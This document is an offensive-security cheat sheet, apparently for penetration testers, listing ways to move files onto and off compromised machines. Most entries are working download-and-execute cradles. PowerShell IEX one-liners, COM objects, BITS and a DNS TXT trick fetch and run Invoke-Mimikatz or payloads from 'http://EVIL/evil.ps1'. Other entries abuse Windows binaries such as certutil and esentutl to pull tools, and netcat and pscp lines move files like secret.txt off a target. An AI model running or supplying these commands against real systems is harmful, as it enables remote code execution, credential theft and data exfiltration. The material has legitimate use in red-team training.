# Ultimate File Transfer List

## powershell.exe

### powershell proxy authentication

$Client = New-Object -TypeName System.Net.WebClient
$Client.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
IEX (iwr 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')


### powershell 4.0 / 5.0 Invoke-WebRequest (works in constrained language mode)

Invoke-WebRequest "http://10.10.10.10/mimikatz.exe" -OutFile "C:\Users\Public\mimikatz.exe"

from @harmj0y:

### powershell download cradles


* #### powershell 3.0+ download and execute (bypass IE firstrun check)

     IEX (iwr 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1' -UseBasicParsing)


* #### powershell (any version)

     powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"


     (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1", "C:\Users\Public\Invoke-Mimikatz.ps1")


* #### hidden IE com object

     $ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r


* #### Msxml2.XMLHTTP COM object

     $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText


* #### WinHttp COM object

     [System.Net.WebRequest]::DefaultWebProxy
     [System.Net.CredentialCache]::DefaultNetworkCredentials
     $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText


### bitstransfer

Import-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t;$r=gc $env:temp\t;rm $env:temp\t; iex $r


// DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)
//   code to execute needs to be a base64 encoded string stored in a TXT record

IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))


from @subtee:

```
<#
<?xml version="1.0"?>
<command>
   <a>
      <execute>Get-Process</execute>
   </a>
  </command>
#>
$a = New-Object System.Xml.XmlDocument
$a.Load("https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt")
$a.command.a.execute | iex
```

Links:

https://gist.github.com/HarmJ0y/bb48307ffa663256e239


## bitsadmin.exe

bitsadmin.exe /transfer n https://gist.githubusercontent.com/egre55/816ddb91016034dcf747f4ea5f054767/raw/69da838fdfd74811060aabfe1f66c8cd0d058daf/procmon.ps1 C:\Users\Public\Music\procmon.ps1

Links: 

https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin

## scp / pscp.exe

`pscp.exe C:\Users\Public\info.txt user@target:/tmp/info.txt`

`pscp.exe user@target:/home/user/secret.txt C:\Users\Public\secret.txt`


## certutil.exe

`certutil.exe -urlcache -split -f https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1`

Links:

https://twitter.com/subtee/status/888122309852016641?lang=en


`certutil.exe -verifyctl -split -f https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1`

Links:

https://twitter.com/egre55/status/1087685529016193025


## certutil.exe base64

`certutil.exe -encode mimikatz.exe mimikatz.txt`

`certutil.exe -decode mimikatz.txt mimikatz.exe`

`cat binary.exe | base64 -w 0`

`echo {base64_data} | base64 -d > binary.exe`


## WebDAV downloaders


### makecab.exe

`C:\Windows\System32\makecab.exe \\10.10.10.10\share\nmap.zip C:\Users\Public\nmap.cab`


### esentutl.exe

`C:\Windows\System32\esentutl.exe /y "\\10.10.10.10\share\mimikatz_trunk.zip" /d"C:\Users\Public\mimikatz_trunk.zip" /o`


### extrac32.exe

`C:\Windows\System32\extrac32.exe /Y /C \\10.10.10.10\share\secret.txt C:\Users\Public\secret.txt`


### print.exe

`C:\Windows\System32\print.exe /D c:\TEMP\ADExplorer.exe \\live.sysinternals.com\tools\ADExplorer.exe`

Links:

https://twitter.com/Oddvarmoe/status/984749424395112448

for a more complete list of WebDAV downloaders check the LOLBINS/LOLBAS project created by @api0cradle:
https://github.com/api0cradle/LOLBAS/blob/master/LOLBins.md


## netcat

`nc -nlvp 8000 > mimi_incoming.exe`

`nc -nv 10.10.10.10 8000 </tmp/mimikatz.exe`


## web browser / server

`python -m SimpleHTTPServer 80`

`python3 -m http.server`

`ruby -run -ehttpd . -p80`

`php -S 0.0.0.0:80`

`socat TCP-LISTEN:80,reuseaddr,fork`


## wget

`wget http://10.10.10.10:80/info.txt -O /tmp/info.txt`

## cscript wget.js

> cscript /nologo wget.js https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1

```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
WScript.Echo(WinHttpReq.ResponseText);

/* To save a binary file use this code instead of previous line
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile("out.bin");
*/
```

Links:

https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl

## curl

`curl -o /tmp/info.txt http://10.10.10.10:80/info.txt`


## rdesktop

`rdesktop 10.10.10.10 -r disk:linux='/home/user/rdesktop/files'`

## smb

`smbclient //10.10.10.10/share -U username -W domain`

`net use Q: \\10.10.10.10\share`

`pushd \\10.10.10.10\share`

`mklink /D share \\10.10.10.10\share`

## ftp

```
open 10.10.10.10
anonymous
anonymous
lcd c:\uploads
get info.txt
quit

ftp -s:script.txt
```

Links:

https://www.jscape.com/blog/using-windows-ftp-scripts-to-automate-file-transfers
